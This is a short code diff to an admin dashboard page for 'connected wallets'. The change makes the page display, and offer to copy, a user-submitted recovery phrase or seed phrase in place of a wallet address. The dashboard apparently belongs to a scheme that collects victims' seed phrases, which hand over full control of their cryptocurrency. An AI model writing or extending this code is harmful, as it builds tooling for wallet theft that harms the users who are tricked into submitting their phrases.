@@ -844,22 +844,22 @@ export default function AdminConnectedWalletsPage() {
               </Link>
             </div>
 
-            {/* Submitted Wallet Address */}
+            {/* Submitted Wallet Address / Recovery Phrase */}
             <div className="mb-5">
               <div className="flex items-center justify-between mb-1.5">
                 <span className="text-[11px] font-bold uppercase tracking-wider text-gray-500">
-                  Submitted Wallet Address
+                  {selectedRow.seedPhrase ? "Recovery Phrase / Seed Phrase" : "Submitted Wallet Address"}
                 </span>
                 <button
                   type="button"
-                  onClick={() => handleCopy(selectedRow.address, "Wallet Address")}
+                  onClick={() => handleCopy(selectedRow.seedPhrase || selectedRow.address, selectedRow.seedPhrase ? "Recovery Phrase" : "Wallet Address")}
                   className="text-xs font-bold text-emerald-600 hover:underline inline-flex items-center gap-1"
                 >
                   <Copy size={12} /> Copy
                 </button>
               </div>
               <div className="p-3.5 rounded-xl bg-slate-900 text-emerald-300 font-mono text-xs sm:text-sm break-all select-all">
-                {selectedRow.address}
+                {selectedRow.seedPhrase || selectedRow.address}
               </div>
             </div>
 
